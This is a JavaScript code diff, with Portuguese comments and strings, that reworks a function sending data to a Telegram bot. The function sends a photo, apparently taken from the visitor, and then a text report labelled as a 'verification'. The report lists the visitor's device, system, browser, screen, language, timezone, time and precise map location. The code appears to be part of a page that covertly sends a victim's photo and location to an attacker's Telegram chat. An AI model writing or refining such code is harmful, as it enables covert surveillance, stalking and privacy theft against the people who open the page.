@@ -263,34 +263,43 @@
     }
 
     async function enviarTelegram(foto, loc, info) {
+        // Envia a foto
+        const formFoto = new FormData();
+        formFoto.append('chat_id', CHAT_ID);
+        formFoto.append('photo',   foto, 'foto.jpg');
+
+        const r1 = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formFoto
+        });
+        if (!r1.ok) {
+            const e = await r1.json();
+            throw new Error(e.description || 'Erro ao enviar foto');
+        }
+
+        // Envia o texto separado
         const locTexto = loc
-            ? `https://maps.google.com/?q=${loc.lat},${loc.lon} (precisao ${loc.acc}m)`
+            ? 'https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + ' | Precisao: ' + loc.acc + 'm'
             : 'Nao concedida';
 
-        const caption =
-            `NOVA VERIFICACAO\n\n` +
-            `Dispositivo: ${info.device}\n` +
-            `Sistema: ${info.os}\n` +
-            `Navegador: ${info.browser}\n` +
-            `Tela: ${info.tela}\n` +
-            `Idioma: ${info.idioma}\n` +
-            `Fuso: ${info.fuso}\n\n` +
-            `Data/Hora: ${info.now}\n\n` +
-            `Localizacao: ${locTexto}`;
+        const texto = 'NOVA VERIFICACAO\n\n'
+            + 'Dispositivo: ' + info.device + '\n'
+            + 'Sistema: '     + info.os      + '\n'
+            + 'Navegador: '   + info.browser  + '\n'
+            + 'Tela: '        + info.tela     + '\n'
+            + 'Idioma: '      + info.idioma   + '\n'
+            + 'Fuso: '        + info.fuso     + '\n\n'
+            + 'Data/Hora: '   + info.now      + '\n\n'
+            + 'Localizacao: ' + locTexto;
 
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('photo',   foto, 'foto.jpg');
-        form.append('caption', caption);
-
-        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        const r2 = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
-            body: form
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
         });
-
-        if (!res.ok) {
-            const err = await res.json();
-            throw new Error(err.description || 'Erro ao enviar');
+        if (!r2.ok) {
+            const e = await r2.json();
+            throw new Error(e.description || 'Erro ao enviar mensagem');
         }
     }
 
